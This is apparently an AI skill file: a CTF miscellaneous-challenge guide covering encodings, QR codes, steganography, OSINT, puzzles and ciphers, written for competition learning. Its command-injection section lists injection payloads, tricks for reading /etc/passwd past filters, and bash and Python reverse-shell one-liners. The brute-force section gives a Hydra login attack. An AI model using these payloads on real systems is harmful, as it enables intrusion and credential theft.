---
name: ctf-misc
description: "CTF miscellaneous skill. When user mentions misc challenges, OSINT, programming puzzles, encoding/decoding, logic puzzles, command injection, guessing challenges, QR codes, audio analysis, image analysis, or miscellaneous CTF challenges. Covers all major misc categories with step-by-step methodology, tool usage, and practical examples."
---

# CTF Miscellaneous — Challenge Solving Brain

When solving misc challenges:
1. **Try the obvious first** — base64, hex, ROT13
2. **Check all encodings** — use CyberChef
3. **Read the challenge carefully** — hints are often in the description
4. **Think outside the box** — misc often requires creative thinking
5. **Google is your friend** — many misc challenges are based on known puzzles

---

## Phase 1: Encoding/Decoding

### Quick Identification
```
SIGNS OF BASE64: A-Za-z0-9+/= padding at end (2 or 4 = signs)
SIGNS OF HEX: [0-9a-fA-F] only, even length
SIGNS OF BINARY: 0s and 1s only, groups of 8
SIGNS OF ROT13: Readable but wrong letters
SIGNS OF MORSE: dots and dashes, spaces between characters
SIGNS OF BINARY STRING: 01010100 01101000...
SIGNS OF BACON: A/B only
SIGNS OF SEMAPHORE: images of flag positions
SIGNS OF BRAILLE: dot patterns
SIGNS OF FLAG: images of flag positions
SIGNS OF BASE32: A-Z and 2-7, padding with =
```

### CyberChef Recipes
```
Base64:     From Base64
Hex:        From Hex
ROT13:      ROT13
Binary:     From Binary
URL Decode: URL Decode
HTML Decode: From HTML Entity
Base32:     From Base32
Base85:     From Base85
```

### Manual Decoding
```python
# Base64
import base64
decoded = base64.b64decode(encoded).decode()

# Hex
decoded = bytes.fromhex(hex_string).decode()

# ROT13
decoded = encoded.translate(str.maketrans(
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
    'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
))

# Binary
decoded = ''.join(chr(int(b, 2)) for b in encoded.split())

# Morse
MORSE_CODE = {
    '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
    '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
    '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
    '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
    '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
    '--..': 'Z', '-----': '0', '.----': '1', '..---': '2', '...--': '3',
    '....-': '4', '.....': '5', '-....': '6', '--...': '7', '---..': '8',
    '----.': '9'
}
decoded = ' '.join(MORSE_CODE[c] for c in encoded.split(' '))
```

### Encoding Chains
```python
# When multiple encodings are applied
# Try: base64 → hex → base64 → ...
# Or: reverse → base64 → hex → ...

# CyberChef "Magic" recipe auto-detects encodings
# Or brute force combinations
```

---

## Phase 2: QR Codes

### Reading QR Codes
```bash
# zbarimg
zbarimg challenge.png

# Python
from pyzbar.pyzbar import decode
from PIL import Image

decoded = decode(Image.open('challenge.png'))
print(decoded[0].data.decode())
```

### Generating QR Codes
```bash
# qrencode
qrencode -o output.png "flag{...}"

# Python
import qrcode
img = qrcode.make('flag{...}')
img.save('output.png')
```

### QR Code Manipulation
```python
# Modify QR code
from PIL import Image
import qrcode

# Generate QR with custom colors
qr = qrcode.QRCode(version=1, box_size=10, border=5)
qr.add_data('flag{...}')
qr.make(fit=True)
img = qr.make_image(fill_color="black", back_color="white")
```

---

## Phase 3: Audio Analysis

### Spectrogram Analysis
```bash
# Generate spectrogram
sox challenge.wav -n spectrogram

# Audacity
# Import → Effects → Spectrogram

# Check for hidden messages in spectrogram
# Common in audio challenges
```

### Audio Steganography
```python
# Extract LSB from audio
import wave

def extract_lsb_audio(filename):
    with wave.open(filename, 'rb') as wav:
        frames = wav.readframes(wav.getnframes())
        bits = ''
        for byte in frames:
            bits += str(byte & 1)
        # Convert to bytes
        message = ''
        for i in range(0, len(bits), 8):
            byte = bits[i:i+8]
            if len(byte) == 8:
                char = chr(int(byte, 2))
                if char.isprintable():
                    message += char
                else:
                    break
        return message

print(extract_lsb_audio('challenge.wav'))
```

### DTMF Tones
```python
# Decode DTMF tones
# Use multimon-ng
# multimon-ng -t wav -a DTMF challenge.wav
```

### Audio Tools
```bash
# Audacity - GUI analysis
# sox - Command line
sox challenge.wav -n stat
sox challenge.wav spectrogram

# multimon-ng
multimon-ng -t wav -a DTMF challenge.wav
multimon-ng -t wav -a TONES challenge.wav

# Sonic Visualiser - Detailed spectrogram
```

---

## Phase 4: Image Analysis

### Image Forensics
```bash
# Metadata
exiftool challenge.png

# LSB extraction
zsteg challenge.png

# Steghide
steghide extract -sf challenge.jpg

# Stegsolve
stegsolve challenge.png

# ImageMagick
identify -verbose challenge.png
```

### Image Manipulation
```python
# Read/write images
from PIL import Image

img = Image.open('challenge.png')
pixels = img.load()

# Extract specific channel
for x in range(img.width):
    for y in range(img.height):
        r, g, b = pixels[x, y][:3]
        # Process pixel values
```

### Pixel Analysis
```python
# Check each color channel
from PIL import Image

img = Image.open('challenge.png')
for channel_name, channel_idx in [('Red', 0), ('Green', 1), ('Blue', 2)]:
    channel = img.split()[channel_idx]
    data = list(channel.getdata())
    print(f"{channel_name}: {data[:50]}")
```

---

## Phase 5: OSINT Techniques

### Web Search
```bash
# Google dorking
site:target.com filetype:pdf
intitle:"index of" "password"
inurl:admin

# Reverse image search
# Google Images, TinEye, Yandex

# Social media
# Check username on multiple platforms
namemchk username
```

### Domain/IP Research
```bash
# WHOIS
whois target.com

# DNS
dig target.com ANY
host target.com

# Subdomains
subfinder -d target.com
amass enum -d target.com

# Certificate transparency
crt.sh/?q=%.target.com
```

### People Search
```bash
# Email lookup
hunter.io
emailrep.io

# Username
namechk.com
whatsmyname.app

# Social profiles
sherlock username
```

---

## Phase 6: Programming Puzzles

### Common Patterns
```
TYPE: Code golf → Shortest solution
TYPE: Algorithm puzzle → Implement the algorithm
TYPE: Obfuscated code → Deobfuscate and understand
TYPE: Brainfuck/whitespace → Interpret the language
TYPE: Malbolge → Find a pre-existing interpreter
```

### Brainfuck Interpreter
```python
def brainfuck(code, input_data=''):
    tape = [0] * 30000
    ptr = 0
    ip = 0
    input_ptr = 0
    output = ''
    
    while ip < len(code):
        cmd = code[ip]
        if cmd == '>': ptr += 1
        elif cmd == '<': ptr -= 1
        elif cmd == '+': tape[ptr] = (tape[ptr] + 1) % 256
        elif cmd == '-': tape[ptr] = (tape[ptr] - 1) % 256
        elif cmd == '.': output += chr(tape[ptr])
        elif cmd == ',':
            if input_ptr < len(input_data):
                tape[ptr] = ord(input_data[input_ptr])
                input_ptr += 1
        elif cmd == '[':
            if tape[ptr] == 0:
                depth = 1
                while depth > 0:
                    ip += 1
                    if code[ip] == '[': depth += 1
                    elif code[ip] == ']': depth -= 1
        elif cmd == ']':
            if tape[ptr] != 0:
                depth = 1
                while depth > 0:
                    ip -= 1
                    if code[ip] == ']': depth += 1
                    elif code[ip] == '[': depth -= 1
        ip += 1
    return output
```

---

## Phase 7: Logic Puzzles

### Common Types
```
TYPE: Sudoku → Solve with backtracking
TYPE: Nonogram → Pattern recognition
TYPE: Logic grid → Elimination
TYPE: Maze → Pathfinding
TYPE: Rubik's cube → Algorithms
```

### Sudoku Solver
```python
def solve_sudoku(board):
    empty = find_empty(board)
    if not empty:
        return True
    row, col = empty
    
    for num in range(1, 10):
        if is_valid(board, num, row, col):
            board[row][col] = num
            if solve_sudoku(board):
                return True
            board[row][col] = 0
    return False

def find_empty(board):
    for i in range(9):
        for j in range(9):
            if board[i][j] == 0:
                return (i, j)
    return None

def is_valid(board, num, row, col):
    # Check row
    if num in board[row]:
        return False
    # Check column
    if num in [board[i][col] for i in range(9)]:
        return False
    # Check box
    box_row, box_col = 3 * (row // 3), 3 * (col // 3)
    for i in range(3):
        for j in range(3):
            if board[box_row + i][box_col + j] == num:
                return False
    return True
```

---

## Phase 8: Command Injection

### Detection
```
TEST PAYLOADS:
; id
| id
`id`
$(id)
&& id
|| id
```

### Bypass Techniques
```bash
# Space bypass
{ls,-la}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat$'\t'/etc/passwd

# Quote bypass
c"at"/etc/passwd
c'a't/etc/passwd

# Variable expansion
x='et';y='c/pa';z='sswd';cat /$x$y$z

# Wildcards
cat /etc/pass*
cat /etc/pass??
```

### Linux Command Injection
```bash
# Reverse shell
bash -i >& /dev/tcp/IP/PORT 0>&1
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## Phase 9: Guessing Challenges

### Common Types
```
TYPE: Password → Brute force, dictionary attack
TYPE: PIN → Numeric brute force
TYPE: Word → Dictionary, contextual guessing
TYPE: Number → Range brute force
```

### Brute Force Tools
```bash
# Hydra (online)
hydra -l admin -P wordlist.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# John (offline)
john --wordlist=rockyou.txt hashes.txt

# Hashcat
hashcat -m 0 hashes.txt rockyou.txt
```

### Custom Brute Force
```python
import itertools
import string

# Character set brute force
for length in range(1, 6):
    for combo in itertools.product(string.ascii_lowercase, repeat=length):
        guess = ''.join(combo)
        # Test guess
```

---

## Phase 10: Crypto Puzzles (Misc)

### Simple Ciphers
```python
# Caesar cipher (ROT-N)
def caesar_decrypt(text, shift):
    result = ''
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base - shift) % 26 + base)
        else:
            result += char
    return result

# Brute force all shifts
for shift in range(26):
    print(f"Shift {shift}: {caesar_decrypt(text, shift)}")
```

### XOR Challenges
```python
# Single-byte XOR
def single_byte_xor(data):
    for key in range(256):
        decrypted = bytes(b ^ key for b in data)
        if all(c in string.printable for c in decrypted.decode('ascii', errors='ignore')):
            print(f"Key {key}: {decrypted.decode()}")
```

---

## CyberChef Quick Reference

```
FROM BASE64:       From Base64
TO BASE64:         To Base64
FROM HEX:          From Hex
TO HEX:            To Hex
ROT13:             ROT13
FROM BINARY:       From Binary
TO BINARY:         To Binary
URL DECODE:        URL Decode
HTML DECODE:       From HTML Entity
GUNZIP:            Gunzip
GUNZIP (RAW):      Gunzip (raw)
BZ2 DECOMPRESS:    BZ2 Decompress
XOR:               XOR
AES DECRYPT:       AES Decrypt
DES DECRYPT:       DES Decrypt
MD5:               MD5
SHA1:              SHA1
SHA256:            SHA256
REGEX:             Regular expression
REPLACE:           Replace
SPLIT:             Split
MERGE:             Merge
CHARCODE:          To Charcode
FROM CHARCODE:     From Charcode
HEX TO RGB:        Hex to RGB
RGB TO HEX:        RGB to Hex
MAGIC:             Magic (auto-detect)
```

---

## Quick Reference: Common Patterns

```
SIGN: Readable but wrong → ROT13 or Caesar
SIGN: Random-looking letters → Base64/Base32
SIGN: Even hex string → Hex encoding
SIGN: Binary 0s and 1s → Binary encoding
SIGN: Morse dots/dashes → Morse code
SIGN: Audio with spectrogram → Hidden message
SIGN: Image with LSB → Steganography
SIGN: QR code → Read it
SIGN: Code puzzle → Implement algorithm
SIGN: Logic puzzle → Systematic approach
```

---

**Remember:** Misc is the most diverse category. Always try the obvious first (encoding), then check metadata, then look for hidden data. CyberChef is your best friend — use the Magic recipe to auto-detect encodings.
